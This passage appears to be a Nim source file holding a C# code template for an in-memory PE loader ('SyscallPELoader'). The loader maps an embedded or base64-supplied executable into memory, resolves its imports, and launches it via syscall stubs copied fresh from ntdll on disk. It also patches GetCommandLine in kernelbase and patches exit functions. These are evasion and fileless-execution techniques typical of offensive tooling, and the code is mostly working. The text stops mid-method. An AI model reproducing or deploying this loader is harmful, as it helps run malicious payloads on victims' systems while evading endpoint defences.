let CSTemplate* = """

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.ConstrainedExecution;
using System.Security;
using System.Diagnostics;
using System.IO.MemoryMappedFiles;

namespace SyscallPELoader
{
    internal static class Program
    {
        private const uint EXECUTION_TIMEOUT = 30000;

        internal static Encoding encoding;

        internal static int Main(string[] args)
        {


            try
            {

                if (IntPtr.Size != 8)
                {
                    Console.WriteLine("\n[-] Process is not 64-bit, this version of run-exe won't work !\n");
                    return -1;
                }
                else

                

                var peRunDetails = ParseArgs(args.ToList());

                if (peRunDetails == null)
                {
                    return -10;
                }

                var peMapper = new PEMapper();
                peMapper.MapPEIntoMemory(peRunDetails.binaryBytes, out var pe, out var currentBase);

                var importResolver = new ImportResolver();
                importResolver.ResolveImports(pe, currentBase);

                peMapper.SetPagePermissions();

                var argumentHandler = new ArgumentHandler();
                if (!argumentHandler.UpdateArgs(peRunDetails.filename, peRunDetails.args))
                {
                    return -3;
                }

                var exitPatcher = new ExitPatcher();
                if (!exitPatcher.PatchExit())
                {
                    return -8;
                }

                var fileDescriptorRedirector = new FileDescriptorRedirector();
                if (!fileDescriptorRedirector.RedirectFileDescriptors())
                {
                    Console.WriteLine("[-] Unable to redirect file descriptors");
                    return -7;
                }

                var extraEnvironmentalPatcher = new ExtraEnvironmentPatcher((IntPtr)currentBase);
                extraEnvironmentalPatcher.PerformExtraEnvironmentPatches();

                // Patch this last as may interfere with other activity
                var extraAPIPatcher = new ExtraAPIPatcher();

                if (!extraAPIPatcher.PatchAPIs((IntPtr)currentBase))
                {
                    return -9;
                }

                fileDescriptorRedirector.StartReadFromPipe();


                // Revert changes
                exitPatcher.ResetExitFunctions();
                extraAPIPatcher.RevertAPIs();
                extraEnvironmentalPatcher.RevertExtraPatches();
                fileDescriptorRedirector.ResetFileDescriptors();
                fileDescriptorRedirector.ClosePipes();
                argumentHandler.ResetArgs();
                peMapper.ClearPE();
                importResolver.ResetImports();

                // Print the output
                var output = fileDescriptorRedirector.ReadDescriptorOutput();


                Console.WriteLine(output);

 
                return 0;
            }
            catch (Exception e)
            {
                
                return -6;
            }
        }

        private static void StartExecution(string[] binaryArgs, PELoader pe, long currentBase)
        {


            FreshSyscall syscallstealer = new FreshSyscall();
            string[] requiredSyscalls = { "NtCreateThreadEx", "NtWaitForSingleObject" };
            syscallstealer.GrabSyscallStub(requiredSyscalls);
            NativeDeclarations.NtCreateThreadEx fSyscallNTCTE = (NativeDeclarations.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(syscallstealer.StubAddressTable["NtCreateThreadEx"], typeof(NativeDeclarations.NtCreateThreadEx));
            NativeDeclarations.NtWaitForSingleObject fSyscallNTWFSO = (NativeDeclarations.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(syscallstealer.StubAddressTable["NtWaitForSingleObject"], typeof(NativeDeclarations.NtWaitForSingleObject));

            try
            {
                Process currentProcess = Process.GetCurrentProcess();
                var threadStart = (IntPtr)(currentBase + (int)pe.OptionalHeader64.AddressOfEntryPoint);
                //var hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
                fSyscallNTCTE(out IntPtr hThread, Native.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, currentProcess.Handle, threadStart, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
                //NativeDeclarations.WaitForSingleObject(hThread, EXECUTION_TIMEOUT);
                fSyscallNTWFSO(hThread, false, 0);
            }
            catch (Exception e)
            {

            }

        }

        private static PeRunDetails ParseArgs(List<string> args)
        {
            string filename;
            string[] binaryArgs;
            byte[] binaryBytes;

            if (args.Contains("---f") || args.Contains("---b"))
            {
                

                filename = args[args.IndexOf("---f") + 1];
                if (args.Contains("---a"))
                {
                    binaryArgs = Encoding.UTF8.GetString(Convert.FromBase64String(args[args.IndexOf("---a") + 1])).Split();
                }
                else
                {
                    binaryArgs = new string[] { };
                }

                binaryBytes = Convert.FromBase64String(args[args.IndexOf("---b") + 1]);
            }
            else
            {
                string byteString = "QWERQWERQWER";
                
                string[] byteValues = byteString.Split(',');

                byte[] byteArray = new byte[byteValues.Length];

                for (int i = 0; i < byteValues.Length; i++)
                {
                    byteArray[i] = byte.Parse(byteValues[i]);
                }

                binaryBytes = byteArray;
                // uncomment this if else completely if the file is embedded

                if (args.Count > 1)
                {
                    binaryArgs = new string[args.Count - 1];
                    Array.Copy(args.ToArray(), 1, binaryArgs, 0, args.Count - 1);
                }
                else
                {
                    binaryArgs = new string[] { };
                }

            }
            return new PeRunDetails { filename = filename, args = binaryArgs, binaryBytes = binaryBytes };
        }



    }

    public class FreshSyscall
    {

        private bool IsNTDLLByteReady = false;

        public Dictionary<string, IntPtr> StubAddressTable = new Dictionary<string, IntPtr> { };

        private IntPtr pNTDLLImage = IntPtr.Zero;

        private Dictionary<string, string> GuidTable = new Dictionary<string, string> { };

        public void GetNTDLLFromDisk(string DefaultPath)
        {
            string NTDLLFullPath;
            try { NTDLLFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName); } catch { NTDLLFullPath = null; }
            if (File.Exists(DefaultPath))
            {
                byte[] NTDLLBytes = System.IO.File.ReadAllBytes(DefaultPath);
                PEReader NTDLL = new PEReader(NTDLLBytes);
                int RegionSize = NTDLL.Is32BitHeader ? (int)NTDLL.OptionalHeader32.SizeOfImage : (int)NTDLL.OptionalHeader64.SizeOfImage;
                int SizeOfHeaders = NTDLL.Is32BitHeader ? (int)NTDLL.OptionalHeader32.SizeOfHeaders : (int)NTDLL.OptionalHeader64.SizeOfHeaders;
                IntPtr pNTDLLImage = Marshal.AllocHGlobal(RegionSize);
                Marshal.Copy(NTDLLBytes, 0, pNTDLLImage, SizeOfHeaders);
                for (int i = 0; i < NTDLL.FileHeader.NumberOfSections; i++)
                {
                    IntPtr pVASectionBase = (IntPtr)((UInt64)pNTDLLImage + NTDLL.ImageSectionHeaders[i].VirtualAddress);
                    Marshal.Copy(NTDLLBytes, (int)NTDLL.ImageSectionHeaders[i].PointerToRawData, pVASectionBase, (int)NTDLL.ImageSectionHeaders[i].SizeOfRawData);
                }
                this.pNTDLLImage = pNTDLLImage;
                this.IsNTDLLByteReady = true;
            }
            else
            {
                if (NTDLLFullPath != null)
                {
                    byte[] NTDLLBytes = System.IO.File.ReadAllBytes(NTDLLFullPath);
                    PEReader NTDLL = new PEReader(NTDLLBytes);
                    int RegionSize = NTDLL.Is32BitHeader ? (int)NTDLL.OptionalHeader32.SizeOfImage : (int)NTDLL.OptionalHeader64.SizeOfImage;
                    int SizeOfHeaders = NTDLL.Is32BitHeader ? (int)NTDLL.OptionalHeader32.SizeOfHeaders : (int)NTDLL.OptionalHeader64.SizeOfHeaders;
                    IntPtr pNTDLLImage = Marshal.AllocHGlobal(RegionSize);
                    Marshal.Copy(NTDLLBytes, 0, pNTDLLImage, SizeOfHeaders);
                    for (int i = 0; i < NTDLL.FileHeader.NumberOfSections; i++)
                    {
                        IntPtr pVASectionBase = (IntPtr)((UInt64)pNTDLLImage + NTDLL.ImageSectionHeaders[i].VirtualAddress);
                        Marshal.Copy(NTDLLBytes, (int)NTDLL.ImageSectionHeaders[i].PointerToRawData, pVASectionBase, (int)NTDLL.ImageSectionHeaders[i].SizeOfRawData);
                    }
                    this.pNTDLLImage = pNTDLLImage;
                    this.IsNTDLLByteReady = true;
                }
            }
        }

        private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName, ref int FunctionSize)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // create a new dictionary for the function pointers
                var FunctionPointersList = new List<Int64>();

                int WantedFunctionIndex = 0;
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string CurrentFunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    Int32 CurrentFunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 CurrentFunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (CurrentFunctionOrdinal - OrdinalBase))));
                    IntPtr CurrentFunctionPtr = (IntPtr)((Int64)ModuleBase + CurrentFunctionRVA);
                    FunctionPointersList.Add((Int64)CurrentFunctionPtr);
                    if (CurrentFunctionName == ExportName)
                    {
                        WantedFunctionIndex = i;
                    }
                }

                if (WantedFunctionIndex == 0)
                {
                    // Export not found
                    throw new MissingMethodException(ExportName + " not found.");
                }

                IntPtr WantedFunctionAddress = (IntPtr)FunctionPointersList[WantedFunctionIndex];
                FunctionPointersList.Sort();
                FunctionPointersList = FunctionPointersList.Distinct().ToList();
                int WantedFunctionIndexSorted = FunctionPointersList.IndexOf((Int64)WantedFunctionAddress);
                IntPtr NextFunctionPointer = (IntPtr)FunctionPointersList[WantedFunctionIndexSorted + 1];
                FunctionSize = (Int32)((Int64)NextFunctionPointer - (Int64)WantedFunctionAddress);
                FunctionPtr = WantedFunctionAddress;
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }
            return FunctionPtr;
        }

        public unsafe void GrabSyscallStub(string[] FuncName)
        {
            for (int i = 0; i < FuncName.Count(); i++)
            {
                IntPtr output = IntPtr.Zero;
                if (!FuncName[i].StartsWith("Nt") && !FuncName[i].StartsWith("Zw"))
                {
                    throw new InvalidOperationException("FreshSyscall can only steals pure NT APIs!");
                }
                if (!this.IsNTDLLByteReady)
                {
                    this.GetNTDLLFromDisk(@"C:\Windows\System32\ntdll.dll");
                }
                int FuncSize = 0;
                IntPtr pFunc = GetExportAddress(this.pNTDLLImage, FuncName[i], ref FuncSize);
                byte[] bSyscallStub = new byte[FuncSize];
                Marshal.Copy(pFunc, bSyscallStub, 0, FuncSize);
                // generate RWX memory
                string NewGuid = Guid.NewGuid().ToString();
                var MemMapSystemMem = MemoryMappedFile.CreateNew(NewGuid, FuncSize, MemoryMappedFileAccess.ReadWriteExecute);
                var MemMapViewAccessor = MemMapSystemMem.CreateViewAccessor(0, FuncSize, MemoryMappedFileAccess.ReadWriteExecute);
                MemMapViewAccessor.WriteArray(0, bSyscallStub, 0, FuncSize);
                byte* pSyscallStub = null;
                MemMapViewAccessor.SafeMemoryMappedViewHandle.AcquirePointer(ref pSyscallStub);
                Console.WriteLine("[+] Got fresh Syscall stub for {0} from disk!", FuncName[i]);
                output = (IntPtr)pSyscallStub;
                this.StubAddressTable.Add(FuncName[i], output);
                this.GuidTable.Add(FuncName[i], NewGuid);
            }
        }

        public void CleanUp()
        {
            foreach (var StubGuid in this.GuidTable.Values)
            {
                var MemMapSystemMem = MemoryMappedFile.OpenExisting(StubGuid);
                MemMapSystemMem.Dispose();
            }
            Marshal.FreeHGlobal(this.pNTDLLImage);
            // resetting values
            this.StubAddressTable.Clear();
            this.GuidTable.Clear();
            this.IsNTDLLByteReady = false;
            this.pNTDLLImage = IntPtr.Zero;
        }
    }

    public class PEReader
    {
        public struct IMAGE_DOS_HEADER
        {      // DOS .EXE header
            public UInt16 e_magic;              // Magic number
            public UInt16 e_cblp;               // Bytes on last page of file
            public UInt16 e_cp;                 // Pages in file
            public UInt16 e_crlc;               // Relocations
            public UInt16 e_cparhdr;            // Size of header in paragraphs
            public UInt16 e_minalloc;           // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
            public UInt16 e_ss;                 // Initial (relative) SS value
            public UInt16 e_sp;                 // Initial SP value
            public UInt16 e_csum;               // Checksum
            public UInt16 e_ip;                 // Initial IP value
            public UInt16 e_cs;                 // Initial (relative) CS value
            public UInt16 e_lfarlc;             // File address of relocation table
            public UInt16 e_ovno;               // Overlay number
            public UInt16 e_res_0;              // Reserved words
            public UInt16 e_res_1;              // Reserved words
            public UInt16 e_res_2;              // Reserved words
            public UInt16 e_res_3;              // Reserved words
            public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;            // OEM information; e_oemid specific
            public UInt16 e_res2_0;             // Reserved words
            public UInt16 e_res2_1;             // Reserved words
            public UInt16 e_res2_2;             // Reserved words
            public UInt16 e_res2_3;             // Reserved words
            public UInt16 e_res2_4;             // Reserved words
            public UInt16 e_res2_5;             // Reserved words
            public UInt16 e_res2_6;             // Reserved words
            public UInt16 e_res2_7;             // Reserved words
            public UInt16 e_res2_8;             // Reserved words
            public UInt16 e_res2_9;             // Reserved words
            public UInt32 e_lfanew;             // File address of new exe header
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt64 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt64 SizeOfStackReserve;
            public UInt64 SizeOfStackCommit;
            public UInt64 SizeOfHeapReserve;
            public UInt64 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)]
            public UInt32 VirtualSize;
            [FieldOffset(12)]
            public UInt32 VirtualAddress;
            [FieldOffset(16)]
            public UInt32 SizeOfRawData;
            [FieldOffset(20)]
            public UInt32 PointerToRawData;
            [FieldOffset(24)]
            public UInt32 PointerToRelocations;
            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;
            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;
            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)]
            public DataSectionFlags Characteristics;

            public string Section
            {
                get
                {
                    int i = Name.Length - 1;
                    while (Name[i] == 0)
                    {
                        --i;
                    }
                    char[] NameCleaned = new char[i + 1];
                    Array.Copy(Name, NameCleaned, i + 1);
                    return new string(NameCleaned);
                }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }

        [Flags]
        public enum DataSectionFlags : uint
        {

            Stub = 0x00000000,

        }


        /// The DOS header

        private IMAGE_DOS_HEADER dosHeader;

        /// The file header

        private IMAGE_FILE_HEADER fileHeader;

        /// Optional 32 bit file header 

        private IMAGE_OPTIONAL_HEADER32 optionalHeader32;

        /// Optional 64 bit file header 

        private IMAGE_OPTIONAL_HEADER64 optionalHeader64;

        /// Image Section headers. Number of sections is in the file header.

        private IMAGE_SECTION_HEADER[] imageSectionHeaders;

        private byte[] rawbytes;

        public PEReader(string filePath)
        {
            // Read in the DLL or EXE and get the timestamp
            using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
            {
                BinaryReader reader = new BinaryReader(stream);
                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                // Add 4 bytes to the offset
                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                UInt32 ntHeadersSignature = reader.ReadUInt32();
                fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (this.Is32BitHeader)
                {
                    optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
                    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }

                imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                {
                    imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }

                rawbytes = System.IO.File.ReadAllBytes(filePath);

            }
        }

        public PEReader(byte[] fileBytes)
        {
            // Read in the DLL or EXE and get the timestamp
            using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
            {
                BinaryReader reader = new BinaryReader(stream);
                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                // Add 4 bytes to the offset
                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                UInt32 ntHeadersSignature = reader.ReadUInt32();
                fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (this.Is32BitHeader)
                {
                    optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
                    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }

                imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                {
                    imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }

                rawbytes = fileBytes;

            }
        }


        public static T FromBinaryReader<T>(BinaryReader reader)
        {
            // Read in a byte array
            byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

            // Pin the managed memory while, copy it out the data, then unpin it
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();

            return theStructure;
        }



        public bool Is32BitHeader
        {
            get
            {
                UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
                return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
            }
        }


        public IMAGE_FILE_HEADER FileHeader
        {
            get
            {
                return fileHeader;
            }
        }


        /// Gets the optional header

        public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
        {
            get
            {
                return optionalHeader32;
            }
        }


        /// Gets the optional header

        public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
        {
            get
            {
                return optionalHeader64;
            }
        }

        public IMAGE_SECTION_HEADER[] ImageSectionHeaders
        {
            get
            {
                return imageSectionHeaders;
            }
        }

        public byte[] RawBytes
        {
            get
            {
                return rawbytes;
            }

        }

    }

    internal class PeRunDetails
    {
        internal string filename;
        internal string[] args;
        internal byte[] binaryBytes;
    }

    internal class ArgumentHandler
    {
        private const int
            PEB_RTL_USER_PROCESS_PARAMETERS_OFFSET =
                0x20; // Offset into the PEB that the RTL_USER_PROCESS_PARAMETERS pointer sits at

        private const int
            RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET =
                0x70; // Offset into the RTL_USER_PROCESS_PARAMETERS that the CommandLine sits at https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters

        private const int RTL_USER_PROCESS_PARAMETERS_MAX_LENGTH_OFFSET = 2;

        private const int
            RTL_USER_PROCESS_PARAMETERS_IMAGE_OFFSET =
                0x60; // Offset into the RTL_USER_PROCESS_PARAMETERS that the CommandLine sits at https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters

        private const int
            UNICODE_STRING_STRUCT_STRING_POINTER_OFFSET =
                0x8; // Offset into the UNICODE_STRING struct that the string pointer sits at https://docs.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-unicode_string

        private byte[] _originalCommandLineFuncBytes;
        private IntPtr _ppCommandLineString;
        private IntPtr _ppImageString;
        private IntPtr _pLength;
        private IntPtr _pMaxLength;
        private IntPtr _pOriginalCommandLineString;
        private IntPtr _pOriginalImageString;
        private IntPtr _pNewString;
        private short _originalLength;
        private short _originalMaxLength;
        private string _commandLineFunc = null;
        private Encoding _encoding;

        public bool UpdateArgs(string filename, string[] args)
        {
            var pPEB = Utils.GetPointerToPeb();
            if (pPEB == IntPtr.Zero)
            {
                return false;
            }

            GetPebCommandLineAndImagePointers(pPEB, out _ppCommandLineString, out _pOriginalCommandLineString,
                out _ppImageString, out _pOriginalImageString, out _pLength, out _originalLength, out _pMaxLength,
                out _originalMaxLength);

            var commandLineString = Marshal.PtrToStringUni(_pOriginalCommandLineString);
            var imageString = Marshal.PtrToStringUni(_pOriginalImageString);

            var newCommandLineString = "";
            var pNewCommandLineString = Marshal.StringToHGlobalUni(newCommandLineString);
            var pNewImageString = Marshal.StringToHGlobalUni(filename);

            if (!Utils.PatchAddress(_ppCommandLineString, pNewCommandLineString))
            {

                return false;
            }

            if (!Utils.PatchAddress(_ppImageString, pNewImageString))
            {

                return false;
            }

            Marshal.WriteInt16(_pLength, 0, (short)newCommandLineString.Length);

            Marshal.WriteInt16(_pMaxLength, 0, (short)newCommandLineString.Length);


            if (!PatchGetCommandLineFunc(newCommandLineString))
            {
                return false;
            }


            var getCommandLineAPIString = Marshal.PtrToStringUni(NativeDeclarations.GetCommandLine());
            
            return true;
        }

        private bool PatchGetCommandLineFunc(string newCommandLineString)
        {
            var pCommandLineString = NativeDeclarations.GetCommandLine();
            var commandLineString = Marshal.PtrToStringAuto(pCommandLineString);

            _encoding = Encoding.UTF8;

            if (commandLineString != null)
            {
                var stringBytes = new byte[commandLineString.Length];

                // Copy the command line string bytes into an array and check if it contains null bytes (so if it is wide or not
                Marshal.Copy(pCommandLineString, stringBytes, 0,
                    commandLineString.Length); // Even if ASCII won't include null terminating byte

                if (!new List<byte>(stringBytes).Contains(0x00))
                {
                    _encoding = Encoding.ASCII; // At present assuming either ASCII or UTF8
                }

                Program.encoding = _encoding;


                // Print the string bytes and what the encoding was determined to be
                var stringBytesHexString = "";
                foreach (var x in stringBytes)
                {
                    stringBytesHexString += x.ToString("X") + " ";
                }

            }

            // Set the GetCommandLine func based on the determined encoding
            _commandLineFunc = _encoding.Equals(Encoding.ASCII) ? "GetCommandLineA" : "GetCommandLineW";


         
            // Write the new command line string into memory
            _pNewString = _encoding.Equals(Encoding.ASCII)
                ? Marshal.StringToHGlobalAnsi(newCommandLineString)
                : Marshal.StringToHGlobalUni(newCommandLineString);

         
            // Create the patch bytes that provide the new string pointer
            var patchBytes = new List<byte>() { 0x48, 0xB8 }; // TODO architecture
            var pointerBytes = BitConverter.GetBytes(_pNewString.ToInt64());

            patchBytes.AddRange(pointerBytes);

            patchBytes.Add(0xC3);

            // Patch the GetCommandLine function to return the new string
            _originalCommandLineFuncBytes = Utils.PatchFunction("kernelbase", _commandLineFunc, patchBytes.ToArray());
            if (_originalCommandLineFuncBytes == null)
            {
                return false;
            }


            return true;
        }

        private static void GetPebCommandLineAndImagePointers(IntPtr pPEB, out IntPtr ppCommandLineString,
            out IntPtr pCommandLineString, out IntPtr ppImageString, out IntPtr pImageString,
            out IntPtr pCommandLineLength, out short commandLineLength, out IntPtr pCommandLineMaxLength,
            out short commandLineMaxLength)
        {

            var ppRtlUserProcessParams = (IntPtr)(pPEB.ToInt64() + PEB_RTL_USER_PROCESS_PARAMETERS_OFFSET);

            var pRtlUserProcessParams = Marshal.ReadInt64(ppRtlUserProcessParams);

            ppCommandLineString = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET +
                                  UNICODE_STRING_STRUCT_STRING_POINTER_OFFSET;
            pCommandLineString = (IntPtr)Marshal.ReadInt64(ppCommandLineString);

            ppImageString = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_IMAGE_OFFSET +
                            UNICODE_STRING_STRUCT_STRING_POINTER_OFFSET;
            pImageString = (IntPtr)Marshal.ReadInt64(ppImageString);

            pCommandLineLength = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET;
            commandLineLength = Marshal.ReadInt16(pCommandLineLength);

            pCommandLineMaxLength = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET +
                                    RTL_USER_PROCESS_PARAMETERS_MAX_LENGTH_OFFSET;
            commandLineMaxLength = Marshal.ReadInt16(pCommandLineMaxLength);

        }

        internal void ResetArgs()
        {

            if (Utils.PatchFunction("kernelbase", _commandLineFunc, _originalCommandLineFuncBytes) == null)
            {

            }

            if (!Utils.PatchAddress(_ppCommandLineString, _pOriginalCommandLineString))
            {

            }

